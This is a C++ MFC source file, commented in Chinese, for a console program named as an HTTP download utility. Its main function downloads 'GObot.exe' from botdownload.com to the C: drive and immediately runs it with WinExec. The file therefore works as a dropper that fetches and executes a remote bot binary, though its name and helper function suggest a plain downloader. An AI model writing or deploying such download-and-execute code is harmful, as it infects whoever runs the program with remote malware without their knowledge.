// HttpDownload.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "HttpDownload.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// The one and only application object

CWinApp theApp;

using namespace std;

INT GetFile(const CString strUrl,const CString strSavePath)
{
	//检查传入的两个参数
	if (strUrl.IsEmpty())
		return -5;
	if (strSavePath.IsEmpty())
		return -6;

	unsigned short nPort;		//用于保存目标HTTP服务端口
	CString strServer, strObject;	//strServer用于保存服务器地址，strObject用于保存文件对象名称
	DWORD dwServiceType,dwRet;		//dwServiceType用于保存服务类型，dwRet用于保存提交GET请求返回的状态号

	//解析URL，获取信息
	if(!AfxParseURL(strUrl, dwServiceType, strServer, strObject, nPort))
	{
		//解析失败，该Url不正确
		return -1;
	}
	//创建网络连接对象，HTTP连接对象指针和用于该连接的HttpFile文件对象指针，注意delete
	CInternetSession intsess;
	CHttpFile *pHtFile = NULL;
	//建立网络连接
	CHttpConnection *pHtCon = intsess.GetHttpConnection(strServer,nPort);
	if(pHtCon == NULL)
	{
		//建立网络连接失败
		intsess.Close();
		return -2;
	}
	//发起GET请求
	pHtFile = pHtCon->OpenRequest(CHttpConnection::HTTP_VERB_GET,strObject);
	if(pHtFile == NULL)
	{
		//发起GET请求失败
		intsess.Close();
		delete pHtCon;pHtCon = NULL;
		return -3;
	}
	//提交请求
	pHtFile->SendRequest();
	//获取服务器返回的状态号
	pHtFile->QueryInfoStatusCode(dwRet);
	if (dwRet != HTTP_STATUS_OK)
	{
		//服务器不接受请求
		intsess.Close();
		delete pHtCon;pHtCon = NULL;
		delete pHtFile;pHtFile = NULL;
		return -4;
	}
	//获取文件大小
	UINT nFileLen = (UINT)pHtFile->GetLength();
	DWORD dwRead = 1;		//用于标识读了多少，为1是为了进入循环
	//创建缓冲区
	CHAR *szBuffer = new CHAR[nFileLen+1];
	TRY 
	{
		//创建文件
		CFile PicFile(strSavePath,CFile::modeCreate|CFile::modeWrite|CFile::shareExclusive);
		while(dwRead>0)
		{  
			//清空缓冲区
			memset(szBuffer,0,(size_t)(nFileLen+1));
			//读取到缓冲区
			dwRead = pHtFile->Read(szBuffer,nFileLen); 
			//写入到文件
			PicFile.Write(szBuffer,dwRead);
		}
		//关闭文件
		PicFile.Close();
		//释放内存
		delete []szBuffer;
		delete pHtFile;
		delete pHtCon;
		//关闭网络连接
		intsess.Close();
	}
	CATCH(CFileException,e)
	{
		//释放内存
		delete []szBuffer;
		delete pHtFile;
		delete pHtCon;
		//关闭网络连接
		intsess.Close();
		return -7;			//读写文件异常
	}
	END_CATCH
		return 0;
}


int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	int nRetCode = 0;

	HMODULE hModule = ::GetModuleHandle(NULL);

	if (hModule != NULL)
	{
		// initialize MFC and print and error on failure
		if (!AfxWinInit(hModule, NULL, ::GetCommandLine(), 0))
		{
			// TODO: change error code to suit your needs
			_tprintf(_T("Fatal Error: MFC initialization failed\n"));
			nRetCode = 1;
		}
		else
		{
			// TODO: code your application's behavior here.
			CString strUrl;
			strUrl= "http://botdownload.com/GObot.exe";
			CString strSavePath;
			strSavePath= "C:\\GObot.exe";
			GetFile(strUrl, strSavePath);
			WinExec("C:\\GObot.exe",SW_SHOWNORMAL); 
			
		}
	}
	else
	{
		// TODO: change error code to suit your needs
		_tprintf(_T("Fatal Error: GetModuleHandle failed\n"));
		nRetCode = 1;
	}

	return nRetCode;
}
